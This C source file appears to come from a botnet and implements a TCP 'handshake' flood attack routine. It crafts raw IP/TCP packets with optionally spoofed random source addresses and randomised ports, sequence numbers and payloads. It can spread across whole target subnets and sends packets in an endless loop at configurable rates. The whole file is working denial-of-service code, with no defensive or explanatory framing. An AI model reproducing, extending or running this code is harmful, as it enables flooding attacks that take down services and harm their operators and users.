#define _GNU_SOURCE

#include "../../attack.h"

unsigned short csum(unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0)
    {
        sum += *(unsigned char *)buf;
    }
    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int psize)
{

    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + psize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + psize;
    unsigned short *tcp = malloc(totaltcp_len);
    _memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    _memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + psize);
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void flood_handshake(struct flood *flood)
{
    int i, fd;
    char **pkts = calloc(flood->num_of_targets, sizeof(char *));
    flood->settings->ack = get_option_number(flood->num_of_options, flood->options, OPT_ACK, 1);

    flood->settings->csleep = get_option_number(flood->num_of_options, flood->options, OPT_CSLEEP, 1900); // Value from oackv1.c
    flood->settings->min_pps = get_option_number(flood->num_of_options, flood->options, OPT_MINPPS, 1); // Value from oackv1.c
    flood->settings->max_pps = get_option_number(flood->num_of_options, flood->options, OPT_MAXPPS, 1000); // Value from oackv1.c

    if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
        flood->settings->length = (rand_next() % (flood->settings->max_length - flood->settings->min_length) + 1) + flood->settings->min_length;

    if (flood->settings->length > 1000)
        flood->settings->length = 1000;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    i = 1;

    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(fd);
        return;
    }

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;
        
        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        /* IP Headers */
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = flood->settings->tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
        iph->id = htons(flood->settings->ident);
        iph->ttl = flood->settings->ttl;

        if (flood->settings->dont_fragment)
            iph->frag_off = htons(1 << 14);

        iph->protocol = IPPROTO_TCP;
        iph->saddr = flood->settings->source_ip;
        iph->daddr = flood->targets[i].addr;

        /* Source Port */
        struct sockaddr_in cliaddr;
        int on = 1, sock;

        tcph->source = htons(flood->settings->source_port == 0xffff ? rand_next() & 0xffff : flood->settings->source_port);
        tcph->dest = htons(flood->settings->dest_port);

        cliaddr.sin_family = AF_INET;
        cliaddr.sin_addr.s_addr = htonl(INADDR_ANY);
        cliaddr.sin_port = tcph->source;
        sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        bind(sock, (struct sockaddr *)&cliaddr, sizeof(cliaddr));

        int x;
        for (x = 0; x < flood->settings->repeat; x++)
        {
            if(tcp_handshake(flood->settings->dest_port, fd, flood->targets[i].addr, _local_addr(), rand_next()) == 0) {
                exit(0);
                return;
            }
            if (flood->settings->csleep != 0)
                usleep(flood->settings->csleep * 1000);
        }

        tcph->seq = htons(flood->settings->seq_rnd);
        tcph->ack_seq = htons(flood->settings->ack_seq_rnd);
        tcph->doff = 5;

        tcph->urg = flood->settings->urg;
        tcph->ack = flood->settings->ack;
        tcph->psh = flood->settings->psh;
        tcph->rst = flood->settings->rst;
        tcph->syn = flood->settings->syn;
        tcph->fin = flood->settings->fin;

        tcph->window = rand_next() & 0xffff;
        rand_str(payload, flood->settings->length);
    }

    while (TRUE)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (flood->settings->min_pps > 0 && flood->settings->max_pps > 0)
            {
                int x = 0;
                for (x = 0; x < rand_next_range(flood->settings->min_pps, flood->settings->max_pps); x++)
                {
                    if (flood->targets[i].netmask < 32)
                        iph->daddr = htonl(ntohl(flood->targets[i].addr) + (((uint32_t)rand_next()) >> flood->targets[i].netmask));

                    if (flood->settings->source_ip == 0xffffffff)
                        iph->saddr = rand_next();

                    if (flood->settings->ident == 0xffff)
                        iph->id = rand_next() & 0xffff;

                    if (flood->settings->dest_port == 0xffff)
                        tcph->dest = rand_next() & 0xffff;

                    if (flood->settings->seq_rnd == 0xffff)
                        tcph->seq = rand_next();

                    if (flood->settings->ack_seq_rnd == 0xffff)
                        tcph->ack_seq = rand_next();

                    if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                        flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                    if (flood->settings->length > 1000)
                        flood->settings->length = rand_next_range(900, 1000);

                    if (flood->settings->random_data)
                        rand_str(data, flood->settings->length);

                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
                    iph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                    tcph->check = 0;
                    tcph->check = tcpcsum(iph, tcph, flood->settings->length);

                    flood->targets[i].sock_addr.sin_port = tcph->dest;

                    sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length, MSG_NOSIGNAL, (struct sockaddr *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
                   
                    usleep(flood->settings->sleep);
                }
                sleep(1);
            }
            else
            {
                if (flood->targets[i].netmask < 32)
                    iph->daddr = htonl(ntohl(flood->targets[i].addr) + (((uint32_t)rand_next()) >> flood->targets[i].netmask));

                if (flood->settings->source_ip == 0xffffffff)
                    iph->saddr = rand_next();

                if (flood->settings->ident == 0xffff)
                    iph->id = rand_next() & 0xffff;

                if (flood->settings->dest_port == 0xffff)
                    tcph->dest = rand_next() & 0xffff;

                if (flood->settings->seq_rnd == 0xffff)
                    tcph->seq = rand_next();

                if (flood->settings->ack_seq_rnd == 0xffff)
                    tcph->ack_seq = rand_next();

                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                if (flood->settings->length > 1000)
                    flood->settings->length = rand_next_range(900, 1000);

                if (flood->settings->random_data)
                    rand_str(data, flood->settings->length);

                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph, flood->settings->length);

                flood->targets[i].sock_addr.sin_port = tcph->dest;

                sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length, MSG_NOSIGNAL, (struct sockaddr *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
                usleep(flood->settings->sleep);
            }
            
        }
    }
}
